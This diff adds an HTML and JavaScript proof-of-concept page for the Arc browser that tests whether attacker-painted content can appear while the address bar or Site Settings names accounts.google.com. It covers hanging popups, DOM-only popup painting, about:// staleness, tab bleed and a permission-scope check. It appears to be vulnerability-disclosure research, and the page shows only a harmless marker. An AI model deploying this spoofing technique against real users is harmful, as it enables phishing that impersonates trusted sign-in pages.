@@ -1,0 +1,341 @@
+<!doctype html>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<title>A3v2 &mdash; pending popup URL + Site Settings desync</title>
+<style>
+ :root{color-scheme:light}
+ body{font:16px/1.45 -apple-system,system-ui,sans-serif;margin:0;padding:16px 14px 55vh;background:#fff;color:#111}
+ h1{font-size:19px;margin:0 0 4px}
+ h2{font-size:13.5px;margin:22px 0 4px;text-transform:uppercase;letter-spacing:.04em;color:#555}
+ pre{background:#0b0b0b;color:#8f8;padding:9px;border-radius:8px;font:11px/1.5 ui-monospace,Menlo,monospace;white-space:pre-wrap;word-break:break-all;margin:8px 0}
+ button{display:block;width:100%;box-sizing:border-box;text-align:left;padding:12px 13px;margin:6px 0;font:13.5px/1.32 -apple-system,system-ui;border:1px solid #ccc;border-radius:11px;background:#f6f6f8;color:#111}
+ .go{background:#1a73e8;border-color:#1a73e8;color:#fff;font-weight:600;text-align:center;font-size:15px;padding:14px}
+ .arm{background:#c00;border-color:#c00;color:#fff;font-weight:600;text-align:center;font-size:15px;padding:14px}
+ .vuln{border-color:#c00;background:#ffecec}
+ .safe{border-color:#2a7;background:#eefbf4}
+ .card{border:1px solid #e2e2e2;border-radius:12px;padding:13px;margin:11px 0}
+ .card.hit{border-color:#c00;background:#fff7f7}
+ .card.clear{border-color:#2a7;background:#f6fdf9}
+ .card.locked{opacity:.42}
+ .card h3{font-size:14.5px;margin:0 0 4px}
+ .n{color:#555;font-size:12.5px;line-height:1.5}
+ .kbd{display:inline-block;font:11.5px ui-monospace;background:#eee;border-radius:5px;padding:1px 6px}
+ #mark{display:none;margin:18px 0;padding:18px;border:3px solid #c00;border-radius:12px}
+ #mark .hd{display:block;font:800 29px/1.1 -apple-system;color:#c00;letter-spacing:-.5px}
+ #log{font:10.5px/1.5 ui-monospace,Menlo,monospace}
+ .big{font-weight:700;color:#c00}
+</style>
+
+<h1>A3v2 &mdash; pending popup URL &rarr; Site Settings</h1>
+<p class="n">A2b already showed Site Settings binds to the false host for an
+<code>about://</code> page &mdash; but that page is blank, so there is no attacker content
+under it. This file chases the one thing that changes the severity:
+<span class="big">can attacker content be on screen while Site Settings names a domain the
+user never visited?</span></p>
+
+<p class="n">Four independent routes are tested. Route&nbsp;1 is the cheap control that gates
+Route&nbsp;2. Routes&nbsp;3&ndash;5 do not depend on Route&nbsp;1 at all &mdash; run them even
+if Route&nbsp;1 comes back closed.</p>
+
+<pre id="env"></pre>
+<div id="mark"><span class="hd">pwned by 33x</span><div id="why" style="margin-top:9px;font-size:13.5px"></div></div>
+
+<!-- ============ ROUTE 1 ============ -->
+<h2>Route 1 &middot; control &mdash; does Arc paint a PENDING popup URL?</h2>
+<div class="card" id="c1">
+ <h3>1 &middot; open, observe, touch nothing</h3>
+ <p class="n">Opens a popup to a URL whose TCP SYN is blackholed &mdash; it hangs 30&ndash;75s
+ and never commits. The opener then does <b>nothing</b>: no paint, no write, no
+ <code>stop()</code>. Read the bar, <b>then also open the menu and read Site Settings</b>,
+ then come back.</p>
+ <button class="go" id="r1">open hanging popup (port 4444)</button>
+ <button id="r1b">alternate: apple.com:8443 (use if the first errors instantly)</button>
+ <div id="q1"></div>
+</div>
+
+<!-- ============ ROUTE 2 ============ -->
+<h2>Route 2 &middot; hanging popup + DOM paint</h2>
+<div class="card locked" id="c2">
+ <h3>2 &middot; <span id="r2state">locked &mdash; Route 1 must fire first</span></h3>
+ <p class="n">Same hanging navigation, but the opener paints the popup by <b>pure DOM
+ mutation</b> (<code>document.title</code>, <code>body.innerHTML</code>,
+ <code>appendChild</code>). It never calls
+ <code>document.open()/write()/close()/stop()</code> &mdash; each of those runs "stop document
+ loading", aborts the provisional navigation, and hands Arc the exact teardown event its
+ 1.48.0 fallback hooks. That is why the earlier nine variants all landed on
+ <code>about:blank</code>.</p>
+ <button class="arm" id="r2" disabled>ARM &mdash; hang + DOM-paint</button>
+ <div id="q2"></div>
+</div>
+
+<!-- ============ ROUTE 3 ============ -->
+<h2>Route 3 &middot; back-navigation staleness &nbsp;<span class="big">&#9733;</span></h2>
+<div class="card" id="c3">
+ <h3>3 &middot; go to about://HOST, then swipe BACK here</h3>
+ <p class="n">Independent of Routes 1&ndash;2. Navigates this tab to the
+ <code>about://</code> page (Site Settings binds to the false host), then you swipe back so
+ <b>this attacker page</b> is on screen again. If Site Settings was cached on commit and is
+ not recomputed on a back navigation, you get attacker content + a false host in Site
+ Settings &mdash; exactly the state that matters.</p>
+ <button class="go" id="r3">navigate to about://HOST/signin</button>
+ <p class="n">Then: swipe back &rarr; you should see THIS page &rarr; open menu &rarr;
+ Site Settings &rarr; read the host &rarr; answer below.</p>
+ <div id="q3"></div>
+</div>
+
+<!-- ============ ROUTE 4 ============ -->
+<h2>Route 4 &middot; cross-tab bleed</h2>
+<div class="card" id="c4">
+ <h3>4 &middot; popup to about://HOST, then return to THIS tab</h3>
+ <p class="n">Opens the <code>about://</code> page in a <b>separate tab</b>, then you switch
+ back here without closing it. Tests whether Arc's Site Settings pane is bound to the
+ foreground tab or to a shared/last-computed value.</p>
+ <button class="go" id="r4">open about://HOST in a new tab</button>
+ <p class="n">Then: switch back to THIS tab &rarr; menu &rarr; Site Settings &rarr; answer.</p>
+ <div id="q4"></div>
+</div>
+
+<!-- ============ ROUTE 5 ============ -->
+<h2>Route 5 &middot; opener re-navigates the popup</h2>
+<div class="card" id="c5">
+ <h3>5 &middot; about://HOST first, then swap in real content</h3>
+ <p class="n">Opens <code>about://HOST/signin</code> (Site Settings binds to the false host),
+ waits, then the opener sets <code>w.location</code> to a real attacker page. Navigating a
+ window you opened is permitted even cross-origin, so this <i>should</i> work despite the
+ opaque origin. If the bar/Site Settings lag behind the new document, the false host is
+ displayed over real rendered content.</p>
+ <button class="go" id="r5">open, then swap to attacker content after 2.5s</button>
+ <div id="q5"></div>
+</div>
+
+<!-- ============ ROUTE 6 ============ -->
+<h2>Route 6 &middot; &#9733;&#9733; does the GRANT reach the real domain?</h2>
+<div class="card" id="c6">
+ <h3>6 &middot; highest severity if it fires</h3>
+ <p class="n">This one needs no PoC code, only your hands. On the
+ <code>about://accounts.google.com/</code> page, open <b>Site Settings</b> and, if there are
+ permission toggles (location / camera / mic / notifications), <b>turn one ON</b>. Then:</p>
+ <p class="n">a. open Arc's global settings &rarr; site permissions list. Is there now an entry
+ for the <b>real</b> host?<br>
+ b. visit the genuine <code>https://accounts.google.com/</code> and check whether the
+ permission is already granted there.</p>
+ <p class="n">If a grant made on the fake page applies to the real domain, that is permission
+ injection, not a display bug, and it is a separate report well above Low.</p>
+ <div id="q6"></div>
+</div>
+
+<h2>Verdict</h2>
+<button class="arm" id="fin">show verdict &amp; report framing</button>
+<pre id="log">log:</pre>
+
+<script>
+(function(){
+ var BRAND = ['accounts','google','com'].join('.');
+ var ABOUT = 'about://' + BRAND + '/signin';
+ var HANG  = ['https://' + BRAND + ':4444/', 'https://www.apple.com:8443/'];
+ var HITS = {};
+
+ document.getElementById('env').textContent =
+  'opener origin : ' + location.origin + '\n' +
+  'about target  : ' + ABOUT + '   (commits, opaque origin, ALWAYS blank)\n' +
+  'hang target   : ' + HANG[0] + '  (SYN blackholed, silent 40s+)\n' +
+  '\n' +
+  'Route 1 asks whether a PENDING popup URL is ever painted. Route 2 needs that.\n' +
+  'Routes 3-6 are independent of Route 1 -- run them regardless.\n' +
+  'Route 6 needs no code, only Site Settings toggles + a visit to the real domain.\n' +
+  '\n' +
+  'Deliberately NOT used: HTTP 204. A 204 makes WebKit call stopLoadingForPolicyChange\n' +
+  '-> didFailProvisionalLoad, and PageLoadState clears the provisional URL inside\n' +
+  'WebKit before the shell sees it -- straight back into the already-fixed bug.';
+
+ function L(s){ var l=document.getElementById('log'); l.textContent += '\n'+s; }
+
+ function ask(slot, cardId, key, opts){
+   var q = document.getElementById(slot);
+   if (q.dataset.b) { q.scrollIntoView({block:'center'}); return; }
+   q.dataset.b = '1';
+   var h = document.createElement('p');
+   h.className = 'n';
+   h.innerHTML = '<b>What did you see?</b>';
+   q.appendChild(h);
+   opts.forEach(function(o){
+     var b = document.createElement('button');
+     b.className = o.v ? 'vuln' : 'safe';
+     b.innerHTML = o.t;
+     b.onclick = function(){
+       HITS[key] = o.v ? o : false;
+       var c = document.getElementById(cardId);
+       c.className = 'card ' + (o.v ? 'hit' : 'clear');
+       Array.prototype.forEach.call(q.querySelectorAll('button'), function(x){ x.style.opacity='.45'; });
+       b.style.opacity = '1';
+       if (o.unlock) unlock2();
+       L(key + ' = ' + (o.v ? 'HIT' : 'clear'));
+     };
+     q.appendChild(b);
+   });
+   q.scrollIntoView({block:'center'});
+ }
+
+ function unlock2(){
+   document.getElementById('c2').className = 'card';
+   document.getElementById('r2').disabled = false;
+   document.getElementById('r2state').textContent = 'UNLOCKED — Route 1 fired';
+   L('Route 2 unlocked.');
+ }
+
+ // ---------- Route 1 ----------
+ function open1(u){
+   var w = window.open(u, 'ctl'+Math.random().toString(36).slice(2,7));
+   if(!w){ L('popup blocked -- tap the button directly'); return; }
+   L('opened ' + u + ' -- read the BAR, then Site Settings. Touch nothing else.');
+   ask('q1','c1','r1',[
+    {v:1,unlock:1,t:'bar showed <b>'+BRAND+'</b> (or with <b>:4444</b>) &mdash; the URL that never loaded'},
+    {v:1,unlock:1,t:'bar showed <b>www.apple.com</b> / <b>apple.com:8443</b>'},
+    {v:0,t:'bar showed <b>about:blank</b>'},
+    {v:0,t:'bar showed <b>'+location.hostname+'</b> (this page, the opener)'},
+    {v:0,t:'bar showed nothing / an empty placeholder'}
+   ]);
+ }
+ document.getElementById('r1').onclick  = function(){ open1(HANG[0]); };
+ document.getElementById('r1b').onclick = function(){ open1(HANG[1]); };
+
+ // ---------- Route 2: DOM-only paint ----------
+ function paint(w){
+   try{
+     w.document.title = 'Sign in';
+     var d = w.document, b = d.body;
+     b.setAttribute('style','margin:0;padding:30px 20px;font:16px/1.5 -apple-system,system-ui;background:#fff;color:#111;text-align:center');
+     b.innerHTML = '';
+     var h = d.createElement('div');
+     h.setAttribute('style','font:800 32px/1.1 -apple-system;color:#c00;margin:36px 0 16px');
+     h.textContent = 'pwned by 33x';
+     var p = d.createElement('div');
+     p.setAttribute('style','font:14px/1.6 -apple-system;color:#333;word-break:break-all');
+     p.innerHTML = 'Every pixel on this tab was written by <b>'+location.hostname+'</b>.<br>'+
+       'No document from the host in the address bar was ever loaded or committed.<br><br>'+
+       '<b>Now open the menu and read Site Settings.</b><br>'+
+       '<span style="font:11px ui-monospace;color:#666">'+new Date().toISOString()+'</span>';
+     b.appendChild(h); b.appendChild(p);
+     L('painted via DOM mutation; navigation still provisional');
+   }catch(e){ L('paint failed: '+e.message); }
+ }
+ document.getElementById('r2').onclick = function(){
+   var w = window.open(HANG[0], 'arm'+Math.random().toString(36).slice(2,7));
+   if(!w){ L('popup blocked'); return; }
+   paint(w);
+   setTimeout(function(){paint(w)}, 900);
+   setTimeout(function(){paint(w)}, 3500);
+   try{ w.onfocus = function(){ paint(w); }; }catch(e){}
+   L('ARMED -- screenshot: red marker body + false host in bar + Site Settings.');
+   ask('q2','c2','r2',[
+    {v:1,t:'red <b>pwned by 33x</b> visible AND Site Settings named <b>'+BRAND+'</b>'},
+    {v:1,t:'red marker visible, bar showed the false host, but Site Settings showed something else'},
+    {v:0,t:'popup stayed blank &mdash; the paint did not land'},
+    {v:0,t:'bar/Site Settings reverted to about:blank or the opener origin'}
+   ]);
+ };
+
+ // ---------- Route 3: back-navigation staleness ----------
+ document.getElementById('r3').onclick = function(){
+   try{ sessionStorage.setItem('a3v2','r3'); }catch(e){}
+   L('navigating to ' + ABOUT + ' -- swipe BACK afterwards, then read Site Settings');
+   location.href = ABOUT;
+ };
+
+ // ---------- Route 4: cross-tab bleed ----------
+ document.getElementById('r4').onclick = function(){
+   var w = window.open(ABOUT, 'bleed'+Math.random().toString(36).slice(2,7));
+   if(!w){ L('popup blocked'); return; }
+   L('opened ' + ABOUT + ' in a new tab -- switch BACK here, then read Site Settings');
+   ask('q4','c4','r4',[
+    {v:1,t:'Site Settings on <b>THIS</b> tab named <b>'+BRAND+'</b>'},
+    {v:0,t:'Site Settings on this tab correctly named <b>'+location.hostname+'</b>'},
+    {v:0,t:'Site Settings was unavailable / empty'}
+   ]);
+ };
+
+ // ---------- Route 5: opener re-navigates the popup ----------
+ document.getElementById('r5').onclick = function(){
+   var w = window.open(ABOUT, 'swap'+Math.random().toString(36).slice(2,7));
+   if(!w){ L('popup blocked'); return; }
+   L('opened ' + ABOUT + ' -- swapping to real content in 2.5s');
+   var payload = location.protocol + '//' + location.host + location.pathname + '?swapped=1';
+   setTimeout(function(){
+     try { w.location = payload; L('swap issued -> ' + payload); }
+     catch(e){ L('swap threw: ' + e.message + ' (navigation was refused)'); }
+   }, 2500);
+   ask('q5','c5','r5',[
+    {v:1,t:'real content rendered AND the bar/Site Settings still named <b>'+BRAND+'</b>'},
+    {v:0,t:'content rendered and bar/Site Settings correctly updated to <b>'+location.hostname+'</b>'},
+    {v:0,t:'the swap was refused &mdash; popup stayed blank on the about:// page'}
+   ]);
+ };
+
+ // ---------- Route 6: grant persistence ----------
+ ask('q6','c6','r6',[
+  {v:1,t:'toggling a permission there created a grant for the <b>real</b> '+BRAND+' &mdash; the real site had it pre-granted'},
+  {v:1,t:'Site Settings offered permission toggles scoped to <b>'+BRAND+'</b> (but I did not verify the real site)'},
+  {v:0,t:'Site Settings named the host but offered no toggles &mdash; display only'},
+  {v:0,t:'no permission surface at all on that page'}
+ ]);
+
+ // ---------- returning from Route 3 ----------
+ try {
+   if (sessionStorage.getItem('a3v2') === 'r3') {
+     sessionStorage.removeItem('a3v2');
+     L('welcome back from the about:// page (Route 3).');
+     ask('q3','c3','r3',[
+      {v:1,t:'THIS page is visible AND Site Settings still named <b>'+BRAND+'</b>'},
+      {v:1,t:'THIS page is visible AND the bar still showed <b>'+BRAND+'</b>'},
+      {v:0,t:'Site Settings correctly showed <b>'+location.hostname+'</b> again'},
+      {v:0,t:'the back navigation did not return me here'}
+     ]);
+     document.getElementById('c3').scrollIntoView({block:'center'});
+   }
+ } catch(e){}
+
+ if (new URLSearchParams(location.search).get('swapped')) {
+   L('this document is the Route 5 swap payload -- read the bar and Site Settings NOW.');
+   document.body.insertAdjacentHTML('afterbegin',
+     '<div style="border:3px solid #c00;border-radius:12px;padding:16px;margin-bottom:14px">' +
+     '<div style="font:800 28px/1.1 -apple-system;color:#c00">pwned by 33x</div>' +
+     '<p class="n" style="margin-top:8px">Route 5 payload. This document is a real, committed ' +
+     'page served by <b>' + location.hostname + '</b>. If the bar or Site Settings still names ' +
+     '<b>' + BRAND + '</b>, screenshot both together.</p></div>');
+ }
+
+ // ---------- verdict ----------
+ document.getElementById('fin').onclick = function(){
+   var keys = Object.keys(HITS).filter(function(k){ return HITS[k]; });
+   var m = document.getElementById('mark');
+   var w = document.getElementById('why');
+   m.style.display = 'block';
+   if (!keys.length) {
+     m.style.borderColor = '#2a7';
+     m.querySelector('.hd').textContent = 'no desync';
+     m.querySelector('.hd').style.color = '#2a7';
+     w.innerHTML = 'Attacker content and the false host could not be put on screen together. ' +
+       'A2 stays a <b>Low</b> on its own: report it as drafted, concede the blank body and the ' +
+       'Not Secure prefix, and cite CVE-2024-26283 as the fix template. The Site Settings ' +
+       'observation still belongs in that report as a second numbered surface &mdash; it just ' +
+       'is not a separate finding without content underneath.';
+   } else {
+     m.querySelector('.hd').textContent = 'pwned by 33x';
+     var r6 = HITS.r6 ? '<br><br><b>Route 6 fired &mdash; file this one first and separately.</b> ' +
+       'A permission grant scoped to a domain the user never visited is permission-scope ' +
+       'confusion, not a display bug. Evidence must be three shots: the fake page\'s Site ' +
+       'Settings, the global permissions list showing the real host, and the real site behaving ' +
+       'as pre-granted.' : '';
+     w.innerHTML = 'Desync confirmed on <b>' + keys.length + '</b> route(s): <b>' +
+       keys.join(', ') + '</b>.<br><br>Attacker-controlled pixels were on screen while Arc ' +
+       'named a domain the user never visited. That removes the "blank page, nothing to phish" ' +
+       'objection from the A2 report entirely &mdash; lead the write-up with this, not with the ' +
+       'about:// scheme trick.' + r6 +
+       '<br><br><b style="font:600 13px -apple-system;color:#111">Screenshot this box together ' +
+       'with the bar and the Site Settings pane.</b>' +
+       '<br><span style="font:11px ui-monospace;color:#555">' + new Date().toISOString() + '</span>';
+   }
+   m.scrollIntoView({block:'center'});
+ };
+})();
+</script>
